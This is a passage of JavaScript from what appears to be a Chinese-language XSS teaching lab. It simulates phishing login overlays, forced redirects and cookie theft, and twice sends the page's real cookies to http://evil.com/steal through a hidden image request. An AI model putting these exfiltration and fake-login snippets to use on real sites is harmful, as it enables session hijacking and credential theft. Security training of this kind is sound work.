                           style="width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; font-size: 14px;"
                           placeholder="请输入您的用户名" required autofocus>
                </div>
                <div style="margin-bottom: 15px;">
                    <label style="display: block; margin-bottom: 5px; font-weight: bold;">🔑 密码:</label>
                    <input type="password" id="dom-phishing-password" 
                           style="width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; font-size: 14px;"
                           placeholder="请输入您的密码" required>
                </div>
                <button type="submit" 
                        style="width: 100%; padding: 12px; background: #007bff; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; font-weight: bold;">
                    🔐 安全登录
                </button>
            </form>
            <div style="text-align: center; font-size: 12px; color: #999;">
                ⚠️ 这是钓鱼攻击演示，您的凭据将被窃取
            </div>
        `;
        
        document.body.appendChild(phishingForm);
        
        // 添加表单提交事件
        const form = phishingForm.querySelector('#dom-phishing-login-form');
        form.addEventListener('submit', function(e) {
            e.preventDefault();
            const username = phishingForm.querySelector('#dom-phishing-username').value;
            const password = phishingForm.querySelector('#dom-phishing-password').value;
            
            // 显示窃取警告
            alert(`⚠️ 钓鱼攻击成功！

您输入的凭据已被窃取：
👤 用户名: ${username}
🔑 密码: ${password}

在真实攻击中，攻击者会利用这些信息登录您的账户并进行恶意操作。`);
            
            // 移除钓鱼表单
            phishingForm.remove();
        });
        
        // 显示初始警告
        alert('⚠️ 钓鱼攻击触发！\n\n页面中已显示登录表单诱导您输入敏感信息。\n\n在真实环境中，这是非常危险的社会工程学攻击。');
    } else if (maliciousScript.includes('location.href')) {
        attackMessage = '页面重定向攻击';
        // 检查是否跳转到恶意网站（演示用途）
        if (maliciousScript.includes('evil.com')) {
            alert('⚠️ XSS页面跳转演示\n\n即将跳转到恶意网站进行演示...\n\n在真实攻击中，攻击者会跳转到恶意网站窃取用户信息。');
            // 延迟执行跳转，让用户看到alert
            setTimeout(() => {
                window.location.href = 'http://evil.com/';
            }, 2000);
        } else {
            alert('⚠️ 安全警告：检测到页面重定向攻击！\n\n在真实环境中，您将被重定向到恶意网站。');
        }
    }
    
    // 在当前查询结果内显示攻击详情
    // 获取最新创建的DOM结果元素
    const allDomResults = document.querySelectorAll('[id^="dom-result-"]');
    const currentResult = allDomResults[allDomResults.length - 1]; // 选择最后一个（最新的）
    if (currentResult) {
        const attackInfoHtml = `
            <div class="attack-info-section mt-3 pt-3 border-top">
                <h5 class="mb-3"><i class="fas fa-exclamation-triangle me-2 text-warning"></i>DOM型XSS攻击详情</h5>
                <div class="attack-details-grid">
                    <div class="detail-item">
                        <span class="detail-label">攻击类型：</span>
                        <span class="detail-value badge bg-info">${attackMessage}</span>
                    </div>
                    <div class="detail-item">
                        <span class="detail-label">恶意脚本：</span>
                        <span class="detail-value">
                            <code class="malicious-script">${escapeHtml(maliciousScript.substring(0, 100))}${maliciousScript.length > 100 ? '...' : ''}</code>
                        </span>
                    </div>
                    <div class="detail-item">
                        <span class="detail-label">触发方式：</span>
                        <span class="detail-value">前端DOM渲染执行</span>
                    </div>
                    <div class="detail-item">
                        <span class="detail-label">危害等级：</span>
                        <span class="detail-value text-danger">⚠️ 高危</span>
                    </div>
                    <div class="detail-item full-width">
                        <span class="detail-label">攻击请求：</span>
                        <span class="detail-value text-muted">GET /target/xss/profile?username=${encodeURIComponent(maliciousScript)}</span>
                    </div>
                    <div class="detail-item full-width">
                        <span class="detail-label">安全提示：</span>
                        <span class="detail-value text-muted">💡 这是真实的XSS攻击场景演示。在生产环境中，此类攻击可能导致账户被盗、数据泄露等严重后果。</span>
                    </div>
                </div>
            </div>
        `;
        currentResult.querySelector('.profile-container').insertAdjacentHTML('afterend', attackInfoHtml);
    }
}

/**
 * 模拟特定类型的XSS效果
 * @param {string} effectType 效果类型
 * @param {number} commentIndex 评论索引
 */
function simulateSpecificXssEffect(effectType, commentIndex) {
    const effectMessages = {
        'basic': '基础XSS弹窗攻击触发！',
        'cookie': 'Cookie窃取攻击！(实际环境中会窃取用户凭证)',
        'phishing': '钓鱼攻击！(实际环境中会诱导用户输入敏感信息)',
        'img': '图片标签XSS攻击触发！',
        'svg': 'SVG标签XSS攻击触发！',
        'pageHijack': '页面劫持攻击！(实际环境中会完全控制页面内容)'
    };
    
    // 特别处理Cookie窃取攻击 - 模拟真实的窃取过程
    if (effectType === 'cookie') {
        // 模拟真实的Cookie窃取攻击
        const stolenCookie = getStolenCookie();
        
        // 创建窃取Cookie的图片请求（模拟攻击者收集信息）
        const imgElement = document.createElement('img');
        imgElement.src = `http://evil.com/steal?cookie=${encodeURIComponent(stolenCookie)}&url=${encodeURIComponent(window.location.href)}`;
        imgElement.style.display = 'none';
        document.body.appendChild(imgElement);
        
        // 显示窃取警告
        let cookieMessage = '';
        if (stolenCookie === '(当前页面无 Cookie)') {
            cookieMessage = `当前页面无 Cookie。

提示：你可以点击"设置测试 Cookie"按钮，或在浏览器控制台手动设置 Cookie 后再测试。`;
        } else {
            cookieMessage = `攻击者已窃取您的 Cookie 信息：
${stolenCookie}`;
        }
        
        alert(`⚠️ Cookie窃取攻击演示

${cookieMessage}

在真实攻击中，这些敏感信息会被发送到恶意服务器。`);
        
        // 延迟跳转到恶意网站（模拟后续攻击）
        setTimeout(() => {
            alert('⚠️ Cookie窃取完成，即将跳转到恶意网站...\n\n在真实环境中，攻击者会利用您的被盗Cookie进行进一步攻击。');
            window.location.href = 'http://evil.com/';
        }, 2000);
        
        // 清理临时元素
        setTimeout(() => {
            if (imgElement.parentElement) {
                imgElement.remove();
            }
        }, 100);
        
        // 同时显示全局警告
        const message = effectMessages[effectType] || 'XSS攻击触发！';
        alert(`⚠️ Cookie窃取攻击触发！

页面中已执行Cookie窃取脚本，您的会话信息已被盗取。

${message}`);
        return;
    }
    
    // 特别处理钓鱼攻击 - 创建输入框诱导用户输入
    if (effectType === 'phishing') {
        // 创建钓鱼表单
        const phishingForm = document.createElement('div');
        phishingForm.id = 'phishing-form-' + Date.now();
        phishingForm.style.cssText = `
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: white;
            padding: 30px;
            border: 2px solid #dc3545;
            border-radius: 10px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
            z-index: 10000;
            min-width: 400px;
            font-family: Arial, sans-serif;
        `;
        
        phishingForm.innerHTML = `
            <div style="text-align: center; margin-bottom: 20px;">
                <h3 style="color: #dc3545; margin: 0;">⚠️ 安全警告</h3>
                <p style="color: #666; margin: 10px 0 0 0;">您的会话已过期，请重新登录</p>
            </div>
            <form id="phishing-login-form" style="margin-bottom: 20px;">
                <div style="margin-bottom: 15px;">
                    <label style="display: block; margin-bottom: 5px; font-weight: bold;">用户名:</label>
                    <input type="text" id="phishing-username" 
                           style="width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box;"
                           placeholder="请输入用户名" required>
                </div>
                <div style="margin-bottom: 15px;">
                    <label style="display: block; margin-bottom: 5px; font-weight: bold;">密码:</label>
                    <input type="password" id="phishing-password" 
                           style="width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box;"
                           placeholder="请输入密码" required>
                </div>
                <button type="submit" 
                        style="width: 100%; padding: 12px; background: #dc3545; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer;">
                    登录
                </button>
            </form>
            <div style="text-align: center; font-size: 12px; color: #999;">
                这是钓鱼攻击演示，在真实环境中您的凭据会被窃取
            </div>
        `;
        
        document.body.appendChild(phishingForm);
        
        // 添加表单提交事件
        const form = phishingForm.querySelector('#phishing-login-form');
        form.addEventListener('submit', function(e) {
            e.preventDefault();
            const username = phishingForm.querySelector('#phishing-username').value;
            const password = phishingForm.querySelector('#phishing-password').value;
            
            // 显示窃取警告
            alert(`⚠️ 钓鱼攻击成功！

您输入的凭据已被窃取：
用户名: ${username}
密码: ${password}

在真实攻击中，攻击者会利用这些信息登录您的账户。`);
            
            // 移除钓鱼表单
            phishingForm.remove();
        });
        
        // 聚焦到用户名输入框
        setTimeout(() => {
            phishingForm.querySelector('#phishing-username').focus();
        }, 500);
        
        // 同时显示全局警告
        const message = effectMessages[effectType] || 'XSS攻击触发！';
        alert(`⚠️ 钓鱼攻击触发！

页面中已显示登录表单诱导您输入敏感信息。

${message}`);
        return;
    }
    
    const message = effectMessages[effectType] || 'XSS攻击触发！';
    
    // 高亮对应的评论项
    const commentElement = document.querySelector(`[data-comment-index="${commentIndex}"]`);
    if (commentElement) {
        commentElement.style.animation = 'pulse 0.5s ease-in-out';
        setTimeout(() => {
            commentElement.style.animation = '';
        }, 500);
    }
    
    // 使用原生alert显示攻击效果
    const effectTypeLabels = {
        'basic': '基础',
        'cookie': 'Cookie窃取', 
        'phishing': '钓鱼',
        'img': '图片标签',
        'svg': 'SVG标签',
        'pageHijack': '页面劫持'
    };
    
    const effectLabel = effectTypeLabels[effectType] || '未知';
    alert(`⚠️ ${effectLabel}XSS攻击触发！

攻击详情：
• 类型：${effectLabel}XSS
• 消息：${message}
• 评论索引：#${commentIndex + 1}

在真实环境中，这将是恶意脚本的实际执行效果！`);
}

/**
 * HTML转义函数
 * @param {string} text 要转义的文本
 * @returns {string} 转义后的文本
 */
function escapeHtml(text) {
    if (!text) return '';
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

/**
 * 加载XSS测试用例
 * @param {string} type 漏洞类型
 * @param {string} caseName 用例名称
 */
function loadXssTestCase(type, caseName) {
    const testCase = XSS_TEST_CASES[type]?.[caseName];
    if (!testCase) return;

    let targetInput;
    switch (type) {
        case 'storage':
            targetInput = document.querySelector(XSS_CONFIG.SELECTORS.COMMENT_INPUT);
            break;
        case 'reflective':
            targetInput = document.querySelector(XSS_CONFIG.SELECTORS.SEARCH_KEYWORD);
            break;
        case 'dom':
            targetInput = document.querySelector(XSS_CONFIG.SELECTORS.USERNAME_INPUT);
            break;
    }

    if (targetInput) {
        targetInput.value = testCase;
        targetInput.focus();
        showNotification(`已加载${getTypeLabel(type)}测试用例: ${caseName}`, 'info');
    }
}

/**
 * 获取类型标签
 */
function getTypeLabel(type) {
    const labels = {
        'storage': '存储型',
        'reflective': '反射型',
        'dom': 'DOM型'
    };
    return labels[type] || type;
}

/**
 * 清空输出
 */
function clearOutput() {
    const outputContainer = document.querySelector(XSS_CONFIG.SELECTORS.OUTPUT_CONTAINER);
    if (!outputContainer) return;
    
    outputContainer.innerHTML = `
        <div class="welcome-message p-4 text-center text-muted">
            <i class="fas fa-bug fa-3x mb-3"></i>
            <h4>测试结果已清空</h4>
            <p class="mb-0">请重新开始XSS漏洞测试</p>
        </div>
    `;
    showNotification('测试结果已清空', 'info');
}

/**
 * 更新状态指示器
 */
function updateStatus(status, text) {
    const indicator = document.querySelector(XSS_CONFIG.SELECTORS.STATUS_INDICATOR);
    if (indicator) {
        const statusClasses = {
            'executing': 'bg-warning status-executing',
            'ready': 'bg-secondary'
        };
        
        const icons = {
            'executing': '<i class="fas fa-circle-notch fa-spin"></i>',
            'ready': '<i class="fas fa-circle"></i>'
        };
        
        indicator.className = `badge ${statusClasses[status] || 'bg-secondary'}`;
        indicator.innerHTML = `${icons[status] || ''} ${text}`;
    }
}

/**
 * 显示/隐藏加载遮罩
 */
function showLoading(show) {
    const overlay = document.querySelector(XSS_CONFIG.SELECTORS.LOADING_OVERLAY);
    if (overlay) {
        overlay.classList.toggle('show', show);
    }
}

/**
 * 显示通知
 */
function showNotification(message, type = 'info') {
    const alertDiv = document.createElement('div');
    alertDiv.className = `alert alert-${type} alert-banner fade show`;
    alertDiv.role = 'alert';
    alertDiv.innerHTML = `
        <i class="fas fa-${getNotificationIcon(type)} me-2"></i>
        ${escapeHtml(message)}
        <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
    `;
    
    Object.assign(alertDiv.style, {
        position: 'fixed',
        top: '50%',
        left: '50%',
        transform: 'translate(-50%, -50%)',
        zIndex: '10000',
        minWidth: '300px',
        textAlign: 'center'
    });
    
    document.body.appendChild(alertDiv);
    
    setTimeout(() => {
        if (alertDiv.parentNode) {
            alertDiv.remove();
        }
    }, 3000);
}

/**
 * 获取通知图标
 */
function getNotificationIcon(type) {
    const icons = {
        'success': 'check-circle',
        'error': 'exclamation-circle',
        'warning': 'exclamation-triangle',
        'info': 'info-circle'
    };
    return icons[type] || 'info-circle';
}

/**
 * 模拟反射型XSS Cookie窃取攻击（三步弹窗效果）
 * @param {string} maliciousScript 恶意脚本内容
 */
function simulateReflectiveCookieStealAttack(maliciousScript) {
    // 第一步：窃取Cookie弹窗
    const stolenCookie = getStolenCookie();
    
    // 创建窃取Cookie的图片请求
    const imgElement = document.createElement('img');
    imgElement.src = `http://evil.com/steal?cookie=${encodeURIComponent(stolenCookie)}&url=${encodeURIComponent(window.location.href)}`;
    imgElement.style.display = 'none';
    document.body.appendChild(imgElement);
    
    // 显示第一步：窃取Cookie警告
    let cookieMessage = '';
    if (stolenCookie === '(当前页面无 Cookie)') {
        cookieMessage = `当前页面无 Cookie。

提示：你可以点击"设置测试 Cookie"按钮，或在浏览器控制台手动设置 Cookie 后再测试。`;
    } else {
        cookieMessage = `攻击者已窃取您的 Cookie 信息：
${stolenCookie}`;
    }
    
    alert(`⚠️ Cookie窃取攻击演示

${cookieMessage}

在真实攻击中，这些敏感信息会被发送到恶意服务器。`);
    
    // 第二步：延迟显示恶意脚本执行弹窗
    setTimeout(() => {
        alert('⚠️ 恶意脚本执行！\n\n反射型XSS攻击脚本正在执行...\n\n在真实环境中，攻击者可以执行任意JavaScript代码。');
        
        // 第三步：延迟显示页面跳转警告
        setTimeout(() => {
            alert('⚠️ 即将跳转到恶意网站...\n\n在真实环境中，攻击者会利用您的被盗Cookie进行进一步攻击。\n\n请注意保护您的账户安全！');
            
            // 模拟跳转到恶意网站
            setTimeout(() => {
                window.location.href = 'http://evil.com/';
            }, 2000);
        }, 1500);
    }, 1000);
    
    // 清理临时元素
    setTimeout(() => {
        if (imgElement.parentElement) {
            imgElement.remove();
        }
    }, 100);
    
    // 显示执行提示
    showNotification('反射型Cookie窃取攻击已触发！', 'warning');
}

/**
 * 获取真实的 Cookie，无 Cookie 时返回明确提示
 * @returns {string} 真实的 Cookie 或提示信息
 */
function getStolenCookie() {
    const actualCookie = document.cookie;
    if (actualCookie && actualCookie.trim() !== '') {
        return actualCookie;
    }
    return '(当前页面无 Cookie)';
}

/**
 * 设置测试用的 Cookie（方便 XSS 测试）
 */
function setTestCookie() {
    const testCookieName = 'session_token';
    const testCookieValue = 'test_' + Math.random().toString(36).substring(2, 15);
    document.cookie = `${testCookieName}=${testCookieValue}; path=/`;
    showNotification(`测试 Cookie 已设置：${testCookieName}=${testCookieValue}`, 'success');
}

// 暴露全局函数
window.loadXssTestCase = loadXssTestCase;
window.clearOutput = clearOutput;
window.getStolenCookie = getStolenCookie;
window.setTestCookie = setTestCookie;